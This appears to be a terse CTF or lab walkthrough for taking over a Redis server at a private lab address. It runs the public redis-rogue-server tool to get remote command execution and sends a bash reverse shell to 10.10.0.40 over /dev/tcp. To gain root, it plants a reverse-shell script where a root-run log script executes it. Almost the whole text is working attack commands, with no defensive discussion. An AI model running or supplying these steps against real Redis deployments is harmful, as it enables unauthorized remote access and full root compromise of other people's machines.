redis vuln:Manual exploit

```zsh
apt get install redis-cli
```

```zsh
redis-cli -h 172.31.1.9
```
https://github.com/n0b0dyCN/redis-rogue-server


```zsh
python3 redis-rogue-server.py --rhost 172.31.1.9 --rport 6379 --lhost 10.10.0.40 --lport 6379
```
Check after it runs , go to the redis-cli: and type - ```system.exec "id"``` 

In the redis server, Interacitve shell:
bash -c 'bash -i >& /dev/tcp/10.10.0.40/444 0>&1'


```
For  privesc: 
run pspy , you will see a script running /var/log/redis/logmanager.sh, check it out. It just executes it and redirect its stderr to /dev/null the log but is running as root. 

Place this script in /var/log/redis/logs:

#!/bin/bash
bash -i >& /dev/tcp/10.10.0.40/444 0>&1

chmod 777 <filename>.zsh
```
Start the listener and will get the root shell